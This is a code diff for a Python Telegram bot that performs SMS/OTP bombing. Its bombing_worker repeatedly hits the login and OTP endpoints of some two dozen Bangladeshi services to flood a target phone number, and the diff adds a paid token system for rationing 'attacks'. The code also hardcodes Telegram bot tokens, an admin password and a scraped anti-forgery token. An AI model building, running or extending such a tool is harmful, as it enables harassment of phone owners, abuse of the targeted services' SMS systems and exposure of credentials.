@@ -8,7 +8,7 @@ import threading
 import atexit
 import signal
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
 # Suppress warnings
@@ -33,10 +33,7 @@ def health():
 # =================================================================================
 
 # Bot configuration
-# test bot token = 8504073239:AAGvQDozBNWc0q_5MJnElGIU-6mUevcuz6w
-
-# main bot token = 8781609298:AAGiER83svBPGA8WnY9LXVmQYS6bEEshAOE
-BOT_TOKEN = "8781609298:AAGSNBb6geKfv5zWKzBCdSnGuZ5C2c8gSKo"
+BOT_TOKEN = "8781609298:AAFU97Zwssf1IUHZJkV5xYlEyPtc-pF2hLM"
 ADMIN_PASS = "A3braham77"
 
 # File paths for data storage
@@ -44,6 +41,7 @@ USERS_FILE = "bot_users.json"
 STATS_FILE = "bot_stats.json"
 LOG_FILE = "bot_activity.json"
 SUPER_USERS_FILE = "super_users.json"
+TOKENS_FILE = "user_tokens.json"
 
 # Global variables
 active_attacks = {}
@@ -56,6 +54,7 @@ bot_stats = {
     'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     'server_status': 'ONLINE'
 }
+user_tokens = {}  # {user_id: {"extra_tokens": int, "daily_free_used": int, "last_daily_reset": str}}
 
 # Server shutdown flag
 server_is_shutting_down = False
@@ -63,7 +62,7 @@ shutdown_initiated = False
 
 # Load saved data
 def load_data():
-    global bot_users, bot_stats, super_users
+    global bot_users, bot_stats, super_users, user_tokens
     try:
         if os.path.exists(USERS_FILE):
             with open(USERS_FILE, 'r', encoding='utf-8') as f:
@@ -74,6 +73,9 @@ def load_data():
         if os.path.exists(SUPER_USERS_FILE):
             with open(SUPER_USERS_FILE, 'r', encoding='utf-8') as f:
                 super_users = json.load(f)
+        if os.path.exists(TOKENS_FILE):
+            with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
+                user_tokens = json.load(f)
     except Exception as e:
         log_activity(f"Error loading data: {e}")
 
@@ -86,6 +88,8 @@ def save_data():
             json.dump(bot_stats, f, indent=2, ensure_ascii=False)
         with open(SUPER_USERS_FILE, 'w', encoding='utf-8') as f:
             json.dump(super_users, f, indent=2, ensure_ascii=False)
+        with open(TOKENS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(user_tokens, f, indent=2, ensure_ascii=False)
     except Exception as e:
         log_activity(f"Error saving data: {e}")
 
@@ -160,7 +164,8 @@ def terminal_commands():
                 print(f"\n👥 User List:")
                 for uid, data in bot_users.items():
                     super_status = "⭐ SUPER" if int(uid) in super_users else "👤 NORMAL"
-                    print(f"   {data['first_name']} (@{data['username']}) - {super_status} - Attacks: {data['total_attacks']}")
+                    token_balance = user_tokens.get(uid, {}).get("extra_tokens", 0)
+                    print(f"   {data['first_name']} (@{data['username']}) - {super_status} - Attacks: {data['total_attacks']} - Tokens: {token_balance}")
             elif cmd == "stopall":
                 admin_stop_all()
             elif cmd == "help":
@@ -257,6 +262,12 @@ def track_user(user_id, username, first_name):
             'last_attack_date': None,
             'daily_attacks': 0
         }
+        # Initialize token data for new user (3 free uses, one-time only)
+        if user_id_str not in user_tokens:
+            user_tokens[user_id_str] = {
+                "extra_tokens": 0,
+                "free_uses_left": 3  # One-time 3 free uses, never resets
+            }
         bot_stats['total_users'] = len(bot_users)
         log_activity(f"New user! {username or first_name} (Total users: {bot_stats['total_users']})")
         save_data()
@@ -266,35 +277,44 @@ def track_user(user_id, username, first_name):
         save_data()
 
 def can_attack(user_id):
-    """Check if user can attack based on limits"""
+    """Check if user can attack based on limits and tokens"""
     user_id_str = str(user_id)
-    if user_id_str not in bot_users:
-        return True
     
-    # Super users have unlimited attacks
+    # Super users (admin only) have unlimited attacks
     if user_id in super_users:
-        return True
+        return True, "Unlimited access (Super User)"
     
-    # Check daily limit for normal users
-    user_data = bot_users[user_id_str]
-    today = datetime.now().strftime("%Y-%m-%d")
-    
-    if user_data.get('last_attack_date') != today:
-        # Reset daily counter
-        user_data['daily_attacks'] = 0
-        user_data['last_attack_date'] = today
+    # Initialize token data if not exists
+    if user_id_str not in user_tokens:
+        user_tokens[user_id_str] = {
+            "extra_tokens": 0,
+            "free_uses_left": 3  # One-time 3 free uses
+        }
         save_data()
-        return True
     
-    # Check if user has reached limit (3 per day)
-    if user_data.get('daily_attacks', 0) >= 3:
-        return False
+    user_token = user_tokens[user_id_str]
     
-    return True
+    # Migration: if old data format, add free_uses_left
+    if "free_uses_left" not in user_token:
+        user_token["free_uses_left"] = 3
+        save_data()
+    
+    # Check one-time free uses (3 total, not daily)
+    free_left = user_token.get("free_uses_left", 0)
+    if free_left > 0:
+        return True, f"Using free use ({3 - free_left + 1}/3)"
+    else:
+        # Check extra tokens
+        if user_token.get("extra_tokens", 0) > 0:
+            return True, f"Using extra token ({user_token['extra_tokens'] - 1} remaining)"
+        else:
+            return False, "No tokens left. Use /apply <reason> or contact admin @morningstarspice"
 
 def increment_attack_count(user_id):
-    """Increment attack counter"""
+    """Increment attack counter and deduct tokens if needed"""
     user_id_str = str(user_id)
+    
+    # Update user stats
     if user_id_str in bot_users:
         today = datetime.now().strftime("%Y-%m-%d")
         if bot_users[user_id_str].get('last_attack_date') != today:
@@ -302,6 +322,19 @@ def increment_attack_count(user_id):
             bot_users[user_id_str]['last_attack_date'] = today
         else:
             bot_users[user_id_str]['daily_attacks'] = bot_users[user_id_str].get('daily_attacks', 0) + 1
+        save_data()
+    
+    # Deduct token if not super user
+    if user_id not in super_users:
+        if user_id_str not in user_tokens:
+            user_tokens[user_id_str] = {"extra_tokens": 0, "free_uses_left": 3}
+        
+        # First use free uses (one-time 3)
+        if user_tokens[user_id_str].get("free_uses_left", 0) > 0:
+            user_tokens[user_id_str]["free_uses_left"] -= 1
+        # Then use extra tokens
+        elif user_tokens[user_id_str].get("extra_tokens", 0) > 0:
+            user_tokens[user_id_str]["extra_tokens"] -= 1
         save_data()
 
 def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, username):
@@ -337,6 +370,9 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
             cycle_success = 0
             cycle_failed = 0
             
+            # Small delay to avoid rate limiting (helps on free hosts like Render)
+            time.sleep(1)
+            
             # Send cycle start
             try:
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
@@ -348,10 +384,128 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
             except:
                 pass
 
+            # 1. Hishabee API (UPDATED)
+            try:
+                time.sleep(0.5)  # Small delay to avoid rate limiting on free hosts
+                url_hishabee = "https://app.hishabee.business/api/V2/otp/send"
+                params_hishabee = {
+                    "mobile_number": clean_number,
+                    "country_code": "88"
+                }
+                headers_hishabee = {
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+                    'origin': 'https://web.hishabee.business',
+                    'platform': 'WEB',
+                    'referer': 'https://web.hishabee.business/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+                res = session.post(url_hishabee, params=params_hishabee, headers=headers_hishabee, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"📊 **Hishabee** → `OTP Sent` ✨ `{res.status_code}`"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"📊 **Hishabee** → `Failed` ⚠️ `{res.status_code}`"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "📊 **Hishabee** → `Error` 💥",
+                    'parse_mode': 'Markdown'
+                })
 
-                        
-            # 31. Sundarban
+            # 2. Bohubrihi API (UPDATED)
+            try:
+                time.sleep(0.5)  # Small delay to avoid rate limiting
+                url_bohubrihi = "https://bb-api.bohubrihi.com/public/activity/otp"
+                headers_bohubrihi = {
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+                    'authorization': 'Bearer undefined',
+                    'content-type': 'application/json',
+                    'origin': 'https://bohubrihi.com',
+                    'referer': 'https://bohubrihi.com/',
+                    'user-agent': 'Mozilla/5.0'
+                }
+                data_bohubrihi = {
+                    "phone": clean_number,
+                    "intent": "login"
+                }
+                res = session.post(url_bohubrihi, json=data_bohubrihi, headers=headers_bohubrihi, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"🎭 **Bohubrihi** → `OTP Triggered` ✨ `{res.status_code}`"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"🎭 **Bohubrihi** → `Failed` ⚠️ `{res.status_code}`"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "🎭 **Bohubrihi** → `Error` 💥",
+                    'parse_mode': 'Markdown'
+                })
 
+            # 3. Swapno API (UPDATED)
+            try:
+                time.sleep(0.5)  # Small delay to avoid rate limiting
+                url_swapno = "https://www.shwapno.com/api/auth"
+                swapno_number = f"+88{clean_number}"
+                headers_swapno = {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+                    'content-type': 'application/json',
+                    'origin': 'https://www.shwapno.com',
+                    'referer': 'https://www.shwapno.com/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+                data_swapno = {
+                    "phoneNumber": swapno_number
+                }
+                res = session.post(url_swapno, json=data_swapno, headers=headers_swapno, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"🛒 **Swapno** → `OTP Sent` ✨ `{res.status_code}`"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"🛒 **Swapno** → `Failed` ⚠️ `{res.status_code}`"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "🛒 **Swapno** → `Error` 💥",
+                    'parse_mode': 'Markdown'
+                })
+
+            # 4. Sundarban
             try:
                 url_sundarban = "https://api-gateway.sundarbancourierltd.com/graphql"
                 headers_sundarban = {
@@ -385,15 +539,16 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Sundarban] ✓ {res.status_code}"
+                    status_text = f"📦 **Sundarban** → `OTP Triggered` ✨ `{res.status_code}`"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Sundarban] ? {res.status_code}"
+                    status_text = f"📦 **Sundarban** → `Failed` ⚠️ `{res.status_code}`"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': status_text
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
                 })
             except:
                 cycle_failed += 1
@@ -402,12 +557,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Sundarban] ✗ Failed"
                 })
-            
 
-
-
-            #biscope
-
+            # 5. Bioscope
             try:
                 url_bioscope = "https://api-dynamic.bioscopelive.com/v2/auth/login"
                 params_bioscope = {"country": "BD", "platform": "web", "language": "en"}
@@ -423,15 +574,16 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Bioscope] ✓ {res.status_code}"
+                    status_text = f"🎬 **Bioscope** → `OTP Sent` ✨ `{res.status_code}`"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Bioscope] ? {res.status_code}"
+                    status_text = f"🎬 **Bioscope** → `Failed` ⚠️ `{res.status_code}`"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': status_text
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
                 })
             except:
                 cycle_failed += 1
@@ -441,42 +593,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Bioscope] ✗ Failed"
                 })
 
-
-
-            
-            # 1. Shwapno
-            try:
-                url_shwapno = "https://www.shwapno.com/api/auth"
-                headers_shwapno = {
-                    'accept': '*/*',
-                    'content-type': 'application/json',
-                    'origin': 'https://www.shwapno.com',
-                    'referer': 'https://www.shwapno.com/',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                }
-                res = session.post(url_shwapno, json={"phoneNumber": full_number}, headers=headers_shwapno, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Shwapno] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Shwapno] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Shwapno] ✗ Failed"
-                })
-            
-            # RedX
+            # 6. RedX
             try:
                 url_redx = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
                 headers_redx = {
@@ -491,15 +608,16 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[RedX] ✓ {res.status_code}"
+                    status_text = f"📦 **RedX** → `OTP Sent` ✨ `{res.status_code}`"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[RedX] ? {res.status_code}"
+                    status_text = f"📦 **RedX** → `Failed` ⚠️ `{res.status_code}`"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': status_text
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
                 })
             except:
                 cycle_failed += 1
@@ -509,10 +627,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[RedX] ✗ Failed"
                 })
 
-
-
-
-                #robiwifi
+            # 7. Robi WiFi
             try:
                 url_robi = "https://robiwifi-mw.robi.com.bd/fwa/wifi/api/v1/primary-phone/send-otp"
                 headers_robi = {
@@ -530,15 +645,16 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Robi WiFi] ✓ {res.status_code}"
+                    status_text = f"📶 **Robi WiFi** → `OTP Sent` ✨ `{res.status_code}`"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Robi WiFi] ? {res.status_code}"
+                    status_text = f"📶 **Robi WiFi** → `Failed` ⚠️ `{res.status_code}`"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': status_text
+                    'text': status_text,
+                    'parse_mode': 'Markdown'
                 })
             except:
                 cycle_failed += 1
@@ -548,8 +664,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Robi WiFi] ✗ Failed"
                 })
 
-            
-            # 3. Bikroy
+            # 8. Bikroy
             try:
                 url_bikroy = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={clean_number}"
                 res = session.get(url_bikroy, headers={"application-name": "web"}, timeout=5)
@@ -573,8 +688,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Bikroy] ✗ Failed"
                 })
-            
-            # 4. GPFI
+
+            # 9. GPFI
             try:
                 url_gp = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
                 headers_gp = {
@@ -604,8 +719,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[GPFI] ✗ Failed"
                 })
-            
-            # 5. Paperfly
+
+            # 10. Paperfly
             try:
                 url_pf = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
                 data_pf = {"full_name": "Morning Star", "company_name": "abcd", "email_address": "ms@gmail.com", "phone_number": raw_number}
@@ -630,53 +745,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Paperfly] ✗ Failed"
                 })
-            
-            # 6. Hishabee
-            try:
-                headers_h = {
-                    "accept": "application/json, text/plain, */*",
-                    "platform": "WEB", 
-                    "user-agent": "Mozilla/5.0",
-                    "origin": "https://web.hishabee.business",
-                    "referer": "https://web.hishabee.business/"
-                }
-                
-                check_url = f"https://app.hishabee.business/api/V2/number_check?mobile_number={clean_number}&country_code=88"
-                session.post(check_url, headers=headers_h, timeout=5)
-                time.sleep(0.5)
-                
-                otp_url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={clean_number}&country_code=88"
-                res = session.post(otp_url, headers=headers_h, timeout=5)
-                
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    try:
-                        res_json = res.json()
-                        if 'message' in res_json:
-                            status_text = f"[Hishabee] ✓ {res_json['message']}"
-                        else:
-                            status_text = f"[Hishabee] ✓ {res.status_code}"
-                    except:
-                        status_text = f"[Hishabee] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Hishabee] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Hishabee] ✗ Failed"
-                })
-            
-            # 7. Osudpotro
+
+            # 11. Osudpotro
             try:
                 url_osudhpotro = 'https://api.osudpotro.com/api/v1/users/send_otp'
                 headers_osudhpotro = {
@@ -712,8 +782,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Osudpotro] ✗ Failed"
                 })
-            
-            # 8. Sikho
+
+            # 12. Sikho
             try:
                 url_sikho = 'https://api.shikho.com/auth/v2/send/sms'
                 headers_sikho = {
@@ -750,8 +820,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Sikho] ✗ Failed"
                 })
-            
-            # 9. Kirei
+
+            # 13. KireiBD
             try:
                 url_kirei = "https://frontendapi.kireibd.com/api/v2/send-login-otp"
                 headers_kirei = {
@@ -784,8 +854,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[KireiBD] ✗ Failed"
                 })
-            
-            # 10. Iqra Live
+
+            # 14. Iqra Live
             try:
                 url_iqra = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_number}"
                 headers_iqra = {
@@ -813,8 +883,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Iqra Live] ✗ Failed"
                 })
-            
-            # 11. Swap
+
+            # 15. Swap
             try:
                 url_swap = "https://api.swap.com.bd/api/v1/send-otp/v2"
                 headers_swap = {
@@ -846,10 +916,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Swap] ✗ Failed"
                 })
-            
-            
 
-            # 14. Easy.com
+            # 16. Easy.com
             try:
                 url_easy = "https://core.easy.com.bd/api/v1/registration"
                 headers_easy = {
@@ -886,11 +954,9 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Easy.com] ✗ Failed"
                 })
-            
-            # 15. Binge Buzz
-  
+
+            # 17. Binge Buzz
             try:
-                # Try different endpoints
                 binge_urls = [
                     "https://api.binge.buzz/api/v4/auth/otp/send",
                     "https://api.binge.buzz/api/v3/auth/otp/send",
@@ -944,12 +1010,9 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 'chat_id': chat_id,
                 'text': status_text
             })
-            
-            
-           
-            # Doctime (two-step)
+
+            # 18. Doctime (two-step)
             try:
-                # Step 1: Hash status (just to validate/initiate)
                 url_doctime_hash = "https://api.doctime.net/api/hashing/status"
                 params_doctime = {
                     "country_calling_code": "88",
@@ -965,7 +1028,6 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 res_hash = session.get(url_doctime_hash, params=params_doctime, headers=headers_doctime, timeout=5)
                 
                 if res_hash.status_code == 200:
-                    # Step 2: Send OTP
                     url_doctime_auth = "https://api.doctime.net/api/v2/authenticate"
                     data_doctime = {
                         "country_calling_code": "88",
@@ -994,43 +1056,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 'chat_id': chat_id,
                 'text': status_text
             })
-                        
 
-                            # Bohubrihi
-            try:
-                url_bohu = "https://bb-api.bohubrihi.com/public/activity/otp"
-                headers_bohu = {
-                    'accept': 'application/json, text/plain, */*',
-                    'content-type': 'application/json',
-                    'origin': 'https://bohubrihi.com',
-                    'referer': 'https://bohubrihi.com/',
-                    'user-agent': 'Mozilla/5.0'
-                }
-                data_bohu = {"phone": clean_number, "intent": "login"}
-                res = session.post(url_bohu, json=data_bohu, headers=headers_bohu, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Bohubrihi] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Bohubrihi] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Bohubrihi] ✗ Failed"
-                })
-                        
-                        
-            # Paragon Food
+            # 19. Paragon Food
             try:
                 url_paragon = "https://www.paragonfood.com.bd/Customer/SendOTP"
                 headers_paragon = {
@@ -1041,7 +1068,6 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'user-agent': 'Mozilla/5.0',
                     'x-requested-with': 'XMLHttpRequest'
                 }
-                # token is dynamic – replace with empty string if not needed
                 token = "CfDJ8HeewtE0hu5IlLYyJTdySwrbUjWs3J9yeY5XFVUJ3SVVDnVwinULjLHcTrbOV00niM_sO7G6-YTBpphHA3BYJt4OvQ1Ts75DaNH_GnaORJRG4SpxBxDEm2niSViRjdqgYnuIJk8E9hdDEgpvnxqX7pA"
                 data_paragon = f"phoneNumber={clean_number}&otpTypeId=1&__RequestVerificationToken={token}"
                 res = session.post(url_paragon, data=data_paragon, headers=headers_paragon, timeout=5)
@@ -1066,9 +1092,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[ParagonFood] ✗ Failed"
                 })
 
-
-            
-            # Apex
+            # 20. Apex
             try:
                 url_apex = "https://api.apex4u.com/api/auth/login"
                 headers_apex = {
@@ -1101,9 +1125,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Apex] ✗ Failed"
                 })
 
-
-            
-            # 22. Binge API
+            # 21. Binge API
             try:
                 url_binge_api = f"https://web-api.binge.buzz/api/v3/otp/send/+88{clean_number}"
                 headers_binge_api = {
@@ -1132,9 +1154,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Binge API] ✗ Failed"
                 })
-            
-            # 23. Hoichoi Signin - FIXED
 
+            # 22. Hoichoi
             try:
                 url_hoichoi = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
                 headers_hoichoi = {
@@ -1172,8 +1193,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Hoichoi] ✗ Failed"
                 })
 
-            
-            # 25. Chorki
+            # 23. Chorki
             try:
                 url_chorki = "https://api-dynamic.chorki.com/v2/auth/login"
                 params_chorki = {"country": "BD", "platform": "web", "language": "en"}
@@ -1206,9 +1226,8 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Chorki] ✗ Failed"
                 })
-            
-            
-            # 27. Deeptoplay
+
+            # 24. Deeptoplay
             try:
                 url_deepto = "https://api.deeptoplay.com/v2/auth/login"
                 params_deepto = {"country": "BD", "platform": "web", "language": "en"}
@@ -1242,132 +1261,26 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Deeptoplay] ✗ Failed"
                 })
             
-            # 28. Teleflix Signup
+            # 25. Foodpanda
             try:
-                url_tf_signup = "https://teleflix.com.bd/home/signupsubmit"
-                headers_tf_signup = {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Origin': 'https://teleflix.com.bd',
-                    'Referer': 'https://teleflix.com.bd/home/signin',
-                    'User-Agent': 'Mozilla/5.0'
-                }
-                data_tf_signup = f"msisdn-signup={clean_number}&register-submit=Sign+Up"
-                res = session.post(url_tf_signup, data=data_tf_signup, headers=headers_tf_signup, timeout=5)
-                if res.status_code in [200, 302]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Teleflix Signup] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Teleflix Signup] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Teleflix Signup] ✗ Failed"
-                })
-            
-            # 29. Teleflix Forgot
-            try:
-                url_tf_forgot = "https://teleflix.com.bd/index.php/home/forgotpass"
-                headers_tf_forgot = {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Origin': 'https://teleflix.com.bd',
-                    'Referer': 'https://teleflix.com.bd/home/signupsubmit',
-                    'User-Agent': 'Mozilla/5.0'
-                }
-                data_tf_forgot = f"msisdn-forgot={clean_number}&forgot-submit=Send+Password"
-                res = session.post(url_tf_forgot, data=data_tf_forgot, headers=headers_tf_forgot, timeout=5)
-                if res.status_code in [200, 302]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Teleflix Forgot] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Teleflix Forgot] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Teleflix Forgot] ✗ Failed"
-                })
-            
-              
-           
-                30 # Toffee API - Auto Token Fetch + OTP Send
-            # Toffee API
-            try:
-                url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
-                headers = {
-                    'accept': '*/*',
-                    'content-type': 'application/json',
-                    'origin': 'https://toffeelive.com',
-                    'referer': 'https://toffeelive.com/',
-                    'user-agent': 'Mozilla/5.0'
-                }
-                
-                data = {"target": f"880{clean_number}", "resend": False}
-                res = session.post(url, json=data, headers=headers, timeout=5)
-                
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Toffee] ✓ {res.status_code}"
-                elif res.status_code == 429:
-                    status_text = "[Toffee] ⏳ Rate limit"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Toffee] ? {res.status_code}"
-                    
-            except:
-                cycle_failed += 1
-                failed += 1
-                status_text = "[Toffee] ✗ Failed"
-            
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                'chat_id': chat_id,
-                'text': status_text
-            })
-            
-            #shomvob
-            try:
-                url_shomvob = "https://backend-api.shomvob.co/api/v2/otp/phone"
-                headers_shomvob = {
+                url_foodpanda = "https://www.foodpanda.com.bd/api/v1/login"
+                headers_foodpanda = {
                     'accept': 'application/json',
